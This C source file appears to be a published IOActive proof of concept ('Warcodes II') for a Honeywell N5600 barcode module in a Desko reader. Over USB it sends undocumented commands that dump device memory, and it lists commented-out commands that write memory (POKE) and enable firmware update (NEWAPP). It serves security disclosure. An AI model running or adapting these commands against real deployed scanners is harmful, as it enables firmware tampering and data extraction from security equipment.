/*

###
Send undocumented commands to the Desko BCR 504 Pro/Honeywell N5600 module through USB.
###

IOActive
Warcodes II - The Desko Case
https://labs.ioactive.com

---------
Compile:
$ gcc undocumented.c -o undocumented -lusb-1.0

Usage:
$ ./undocumented

[+] n5600 Device found
[+] Sending command...OK

---- Response from n5600 ------------------------------------


80001000 - 18 F0 9F E5 18 F0 9F E5 18 F0 9F E5 18 F0 9F E5
80001010 - 18 F0 9F E5 00 00 A0 E1 18 F0 9F E5 18 F0 9F E5
80001020 - B8 33 1C 80 40 10 00 80 70 10 00 80 A8 10 00 80
80001030 - D8 10 00 80 00 00 00 00 08 11 00 80 9C 11 00 80
80001040 - FF 5F 2D E9 00 40 2D E9 20 E2 9F E5 FF 7F CE E8
80001050 - 00 00 A0 E1 18 E2 9F E5 00 C0 4F E1 00 C0 8E E5
80001060 - 01 00 BD E8 04 00 40 E2 58 04 00 EB FF 9F FD E8
80001070 - FF 5F 2D E9 00 40 2D E9 F0 E1 9F E5 FF 7F CE E8
80001080 - 00 00 A0 E1 E8 E1 9F E5 00 C0 4F E1 00 C0 8E E5
80001090 - 02 00 BD E8 04 10 41 E2 00 00 91 E5 FF 04 C0 E3
800010A0 - 4B 04 00 EB FF 9F FD E8 04 E0 4E E2 FF 5F 2D E9
800010B0 - 00 40 2D E9 B4 E1 9F E5 FF 7F CE E8 00 00 A0 E1
800010C0 - AC E1 9F E5 00 C0 4F E1 00 C0 8E E5 01 00 BD E8
800010D0 - 40 04 00 EB FF 9F FD E8 04 E0 4E E2 FF 5F 2D E9
800010E0 - 00 40 2D E9 84 E1 9F E5 FF 7F CE E8 00 00 A0 E1
800010F0 - 7C E1 9F E5 00 C0 4F E1 00 C0 8E E5 01 00 BD E8

---------
For Research Purposes Only.

Ruben Santamarta

--------

Bus 001 Device 008: ID 0c2e:0967 Metrologic Instruments N5600
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               1.10
  bDeviceClass            0 
  bDeviceSubClass         0 
  bDeviceProtocol         0 
  bMaxPacketSize0        64
  idVendor           0x0c2e Metrologic Instruments
  idProduct          0x0967 
  bcdDevice            9.04
  iManufacturer           1 Honeywell Imaging & Mobility    
  iProduct                2 N5600
  iSerial                 8 19214B0217
  bNumConfigurations      1
  Configuration Descriptor:
    bLength                 9
    bDescriptorType         2
    wTotalLength       0x0029
    bNumInterfaces          1
    bConfigurationValue     1
    iConfiguration          3 Default
    bmAttributes         0xa0
      (Bus Powered)
      Remote Wakeup
    MaxPower              400mA
    Interface Descriptor:
      bLength                 9
      bDescriptorType         4
      bInterfaceNumber        0
      bAlternateSetting       0
      bNumEndpoints           2
      bInterfaceClass         3 Human Interface Device
      bInterfaceSubClass      0 
      bInterfaceProtocol      0 
      iInterface              4 HID POS
        HID Device Descriptor:
          bLength                 9
          bDescriptorType        33
          bcdHID               1.10
          bCountryCode            0 Not supported
          bNumDescriptors         1
          bDescriptorType        34 Report
          wDescriptorLength     144
         Report Descriptors: 
           ** UNAVAILABLE **
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x82  EP 2 IN
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0040  1x 64 bytes
        bInterval               4
      Endpoint Descriptor:
        bLength                 7
        bDescriptorType         5
        bEndpointAddress     0x07  EP 7 OUT
        bmAttributes            3
          Transfer Type            Interrupt
          Synch Type               None
          Usage Type               Data
        wMaxPacketSize     0x0040  1x 64 bytes
        bInterval               1

*/

#include <stdio.h>    
#include <stdlib.h>  
#include <unistd.h>  
#include <ctype.h>
#include <stdbool.h>
#include <sys/types.h>    
#include <string.h>    
#include <libusb-1.0/libusb.h>    


#define BULK_EP_OUT     0x07   
#define BULK_EP_IN      0x82   

#define TRUE    1
#define FALSE   0

int main(int argc, char **argv)    
{    
    int result = FALSE;    
    struct libusb_device **devs;    
    struct libusb_device_handle *handle = NULL, *hDevice_expected = NULL;    
    struct libusb_device *dev,*dev_expected;    

    struct libusb_device_descriptor desc;    
  


    unsigned char *inputBuf, *outputBuf;    
    int transferred = 0;    
    int received = 0;    
    int length = 0;    


    ssize_t numDevices;    
    int e = 0,config2;    
    int i = 0,index;    

    bool bFound = FALSE;    

    inputBuf = (unsigned char *)calloc(0x400, 1);    
    outputBuf = (unsigned char *)calloc(0x400, 1);    
    
   

    // LibUSB common stuff
    result = libusb_init(NULL);    

    if(result < 0)    
    {  

        printf("[+] Libusb error");    
        return 1;  

    } 
    
 
    numDevices = libusb_get_device_list(NULL, &devs);    
    if (numDevices < 0)    
    {    
        printf("[+] No USB devices USB found\n");    
        return -1;    
    }    


    while ((dev = devs[i++]) != NULL)    
    {    
        result = libusb_get_device_descriptor(dev, &desc);  

        if (result < 0)    
        {    
            printf("[+] Unable to get device descriptor\n");    
            libusb_free_device_list(devs,1);    
            libusb_close(handle);    
            break;    
        }    

        if(desc.idVendor == 0x0c2e && desc.idProduct == 0x0967)    
        {    
            bFound = TRUE;   
            e = libusb_open(dev, &handle);

            if (e < 0)    
            {    
                printf("[+] Error opening device\n");    
                libusb_free_device_list(devs,1);    
                libusb_close(handle);    
                break;    
            }     
            break;    
        }    

    }   

    if(!bFound)    
    {    
        printf("[+] n5600 Device not found (is DESKO VCOM Installed? Then try the VCOM port) \n");    
        libusb_free_device_list(devs,1);    
        libusb_close(handle);    
        return FALSE;    
    }    
    else    
    {    
        printf("[+] n5600 Device found\n");    
        dev_expected = dev;    
        hDevice_expected = handle;    
    }    

    e = libusb_get_configuration(handle,&config2);    

    if(e!=0)    
    {    
        printf("[+] Error in libusb_get_configuration\n");    
        libusb_free_device_list(devs,1);    
        libusb_close(handle);    
        return -1;    
    }    
   

    if(config2 != 1)    
    {    
        libusb_set_configuration(handle, 1);   

        if(e!=0)    
        {    
            printf("[+] Error in libusb_set_configuration\n");    
            libusb_free_device_list(devs,1);    
            libusb_close(handle);    
            return -1;    
        }    
         
    }    

    libusb_free_device_list(devs, 1);    
    
    if(libusb_kernel_driver_active(handle, 0))    
    {    
        printf("[+] Kernel Driver Active\n"); 

        if(!libusb_detach_kernel_driver(handle, 0))  
        {  
            printf("[+] Kernel Driver Detached\n"); 
        } else {    
            printf("[+] Error detaching kernel driver\n");    
            libusb_free_device_list(devs,1);    
            libusb_close(handle);    
            return -1;    
        }    
    }    

    e = libusb_claim_interface(handle, 0);    
    if(e < 0)    
    {    
        printf("[+] Error claiming interface \n");
        libusb_close(handle);    
        return -1;    
    }  

    ///// Send Command to the n5600 device.
    
    /*
    unsigned char command[]="\xFD\x0B\x16N\x2CNEWAPP\x0D";         // Enable firmware update and reboot
    unsigned char command[]="\xFD\xF0\x16N,POKE 80001000 E5\x0D";  // Write 'E5' to memory
    unsigned char command[]="\xFD\x11\x16N,PEEK 80001000\x0D";     // Read bytes from memory
    unsigned char command[]="\xFD\x0B\x16M\x0dMNUENA?.";           // Check MNUENA status
    */

    unsigned char command[]="\xFD\x17\x16N,DUMPMEMORY 80001000\x0D";
    length = sizeof(command) - 1;
    memcpy(inputBuf,command,length);    

    length = 64;

    printf("[+] Sending command...");    

    e = libusb_interrupt_transfer(handle, BULK_EP_OUT, inputBuf, length, &transferred, 0);    
   
    if(!e && transferred == length)    
    {     
        printf("OK\n");  
        printf("\n---- Response from n5600 ------------------------------------\n\n");
    } else {  
        printf("[+] Error '%s'\n",libusb_strerror(e));    
    }
   
    i = 0;    
     
    do{
        e = libusb_interrupt_transfer(handle, BULK_EP_IN, outputBuf, 64, &received, 2000);  
        if(!e)    
        {  
         
            for(i = 0; i< outputBuf[1]; i++)  
            {
                printf("%c",outputBuf[i+5]);   
            }
                
        } else {    
            printf("\n[+] Done '%s'\n",libusb_strerror(e));     
            break;    
        } 
        
        memset(outputBuf,'\0',0x100);  
    }while( !e );


    libusb_release_interface(handle, 0);    

    libusb_close(handle);    
    libusb_exit(NULL);    
  
    return TRUE;    
}    
